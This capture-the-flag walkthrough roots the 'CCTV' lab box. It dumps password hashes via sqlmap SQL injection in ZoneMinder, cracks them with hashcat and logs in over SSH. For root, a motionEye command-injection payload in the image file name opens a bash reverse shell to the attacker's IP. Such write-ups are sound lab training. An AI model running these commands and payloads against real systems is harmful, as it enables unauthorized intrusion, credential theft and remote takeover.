# CCTV: Easy

```sh
sudo vim /etc/hosts
# add cctv.htb

nmap -T4 -p- -A -Pn -v cctv.htb
```

* open ports & services:

    * 22/tcp: ssh: OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
    * 80/tcp: http: Apache httpd 2.4.58

* the webpage on port 80 is for 'SecureVision', a company for CCTV monitoring & security solutions

* the footer gives us the email IDs 'info@cctv.htb' and 'info@securevision.com'

* the webpage also contains a 'Staff Login' link to '/zm'

* the page at '/zm' is a login page for 'ZoneMinder'

* Googling for [ZoneMinder](https://zoneminder.com/) shows that it is a video surveillance software system; it [has a GitHub repo](https://github.com/ZoneMinder/zoneminder) as well

* checking for ZoneMinder default creds shows creds like 'admin:admin'

* if we try logging in using 'admin:admin' it works, and we get access to the ZoneMinder console page at 'http://cctv.htb/zm/?view=console'

* the console page header also discloses ZoneMinder version info: v1.37.63

* Googling for any exploits associated with ZoneMinder 1.37.63 leads to [CVE-2024-51482: a boolean-based SQLi vuln](https://nvd.nist.gov/vuln/detail/CVE-2024-51482)

* checking the [linked advisory for CVE-2024-51482](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3) shows the vulnerable request: ```http://hostname_or_ip/zm/index.php?view=request&request=event&action=removetag&tid=1```, where 'tid' is vulnerable to SQLi

* the POC also lists the ```sqlmap``` command that can be used to fetch the data: we can refer this:

    ```sh
    sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' -p tid --cookie 'ZMSESSID=gip3kembgcq0uk3nvvpa7am4rg' --batch --dump
    # cookie for the login part
    # 'tid' marked as the vulnerable param
    ```

* ```sqlmap``` is able to get the payload for exploiting SQLi, and the DB 'zm' is detected: so we can skip rest of the tables and dump the user table directly: documentation confirms 'Users' table is used in ZoneMinder:

    ```sh
    sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' -p tid --cookie 'ZMSESSID=gip3kembgcq0uk3nvvpa7am4rg' --batch --dump -D zm -T Users
    # this takes a lot of time so we can fetch only specific columns

    sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' -p tid --cookie 'ZMSESSID=gip3kembgcq0uk3nvvpa7am4rg' --batch --dump -D zm -T Users -C Email,Name,Password
    ```

* ```sqlmap``` dumps the usernames and passwords:

    * no username: '$2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm'
    * 'mark': '$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.'
    * 'admin': '$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m'

* online hash identifier tools confirm that it is a bcrypt hash format

* we can try checking the 'admin' hash first using ```hashcat``` before cracking the other hashes:

    ```sh
    vim adminhash

    vim markhash

    vim blankhash
    # paste the hash in the respective files

    hashcat -m 3200 -a 0 adminhash /usr/share/wordlists/rockyou.txt
    # test with admin hash first as it is known
    # this works and cracks the password 'admin'

    # check for other two hashes
    hashcat -m 3200 -a 0 markhash /usr/share/wordlists/rockyou.txt
    # this works

    hashcat -m 3200 -a 0 blankhash /usr/share/wordlists/rockyou.txt
    ```

* ```hashcat``` is able to crack the hash for 'mark' to give the password 'opensesame'

* we can try logging into SSH as 'mark' now:

    ```sh
    ssh mark@cctv.htb
    # this works

    ls -la

    ls -la /home
    # we have another user 'sa_mark'

    ls -la /home/sa_mark
    # permission denied

    sudo -l
    # cannot run as sudo

    ls -la /
    ```

* we can use ```linpeas``` for initial enum: fetch script from attacker:

    ```sh
    wget http://10.10.14.65:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 6.8.0-111-generic, Ubuntu 24.04.4
    * user 'mark' is part of other groups: 'cdrom', 'dip' and 'plugdev'
    * multiple network interfaces listed, including for ```docker```
    * local-only listeners on multiple ports: 1935, 3306, 7999, 8554, 8765, 8888, 9081, 33060
    * files for ZoneMinder found in ```/usr/share/zoneminder/www``` and ```/usr/lib/zoneminder/cgi-bin```
    * docker socket file at ```/usr/lib/systemd/system/docker.socket```
    * ```tcpdump``` has capability set for ```cap_net_raw=eip```
    * ```/opt``` includes readable directory ```video/```

* we can check the ```/opt``` dir first:

    ```sh
    ls -la /opt

    ls -la /opt/video

    ls -la /opt/video/backups
    # single log file

    cat /opt/video/backups/server.log
    ```

* the file ```/opt/video/backups/server.log``` contains authorization logs for the user 'sa_mark', and includes the commands issued: like 'status' & 'disk-info', and the commands are issued almost very minute: indicating a cronjob, as the file is also updated regularly

* we can also check the ports listening on localhost for any other services:

    ```sh
    curl http://localhost:1935
    # empty reply from server

    curl http://localhost:7999
    # mentions 'Motion 4.7.1 Running [1] Camera'

    curl http://localhost:8554
    # empty

    curl http://localhost:8765
    # gives code for a webpage

    curl http://localhost:8888
    # 404 page not found

    curl http://localhost:9081
    # this gives binary output, so we need to save it to a file
    ```

* from the local services, the ports 7999, 8765 and 9081 seem interesting

* we can check these services from the attacker to know more, using SSH local port forwarding:

    ```sh
    # on attacker

    ssh -L 1234:localhost:7999 mark@cctv.htb

    ssh -L 1235:localhost:8765 mark@cctv.htb

    ssh -L 1236:localhost:9081 mark@cctv.htb
    ```

* on attacker, checking the first webpage on port 1234, we get the same information about 'Motion 4.7.1': this could be a camera-related solution

* the webpage on port 1235 leads to a login prompt for 'motionEye': this also seems to be a CCTV related software

* the creds 'admin:admin' fail here, and re-using previous creds like 'mark:opensesame' and 'admin:opensesame' fail

* Googling for default creds shows 'admin' without password, and 'user' without password

* the latter works, and we are able to login as 'user', and we are led to the frontend for a CCTV recording: but this does not give us much info

* there seem to be some advanced configuration options, but we don't have access to it as a standard user

* checking the source code gives us the version info: motionEye version 0.43.1b4, and Motion version 4.7.1

* checking the webpage on port 1236 leads to the same CCTV stream seen earlier, but no useful info is revealed here

* Googling for motionEye shows that [it is a web frontend for the motion daemon](https://github.com/motioneye-project/motioneye)

* the ```motion``` daemon is a Linux program that continuously processes video streams; motionEye makes it easy to manage

* Googling for exploits associated with motionEye 0.43.1b4 leads to [CVE-2025-60787: a command injection RCE vuln](https://github.com/advisories/GHSA-j945-qm58-4gjx): the POC shows that we need admin access to the dashboard for this

* Googling for exploits associated with Motion 4.7.1 leads to the same exploit: so we need to find valid admin creds for MotionEye to proceed further with the exploit

* we can check for any config files associated with Motioneye: we need to check at the path ```/etc/motioneye```:

    ```sh
    ls -la /etc/motioneye
    # we have a few readadble config files here

    cat /etc/motioneye/camera-1.conf

    cat /etc/motioneye/motion.conf

    cat /etc/motioneye/motioneye.conf
    ```

* the file ```/etc/motioneye/motion.conf``` contains a commented-out admin password '989c5a8ee87a0e9521ec81a79187d162109282f0'

* hash identifier tools detect this hash as a SHA1 hash: we can try cracking it using ```hashcat```:

    ```sh
    # on attacker

    vim motionhash
    # paste hash

    hashcat -m 100 -a 0 motionhash /usr/share/wordlists/rockyou.txt
    # unable to crack the hash
    ```

* ```hashcat``` is unable to crack the hash

* if we try using it a password directly: 'admin:989c5a8ee87a0e9521ec81a79187d162109282f0': it works and we are able to log into motionEye as the admin user

* now, we can try to follow the POC steps from the GitHub advisory:

    * click on the sidebar to view the settings panel: we already have a RTSP camera feed here for 'CAM 01': at ```rtsp://localhost:8554/cam01``` - so we do not need to add a new RTSP camera

    * next, override the client-side validation for the image filename: open the browser console: Developer Tools

    * navigate to the JS file ```/static/js/main.js?v=0.43.1b4```, which refers the file ```/static/js/ui.js?v=0.43.1b4``` - we can view the file in the Debugger section

    * here, modify the validation function to override the function to always return true: open the Console window and enter the JS code:

        ```js
        configUiValid = function() { return true; };
        ```
    
    * now, setup listener on attacker using ```nc -nvlp 5555```

    * next, attempt the payload injection in the 'Still Images' settings:

        * set 'Capture Mode' to 'Interval Snapshots'
        * set 'Interval' to 10 seconds
        * set 'Image File Name' to a revshell one-liner payload: ```$(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/10.10.14.65/5555 0>&1\"')").%Y-%m-%d-%H-%M-%S```
        * then, click 'Apply' to save the settings

* the exploit works and we get root shell on our listener after the settings are applied:

    ```sh
    # in reverse shell

    id
    # root

    ls -la /home/sa_mark

    cat /home/sa_mark/user.txt
    # user flag

    cat /root/root.txt
    # root flag
    ```
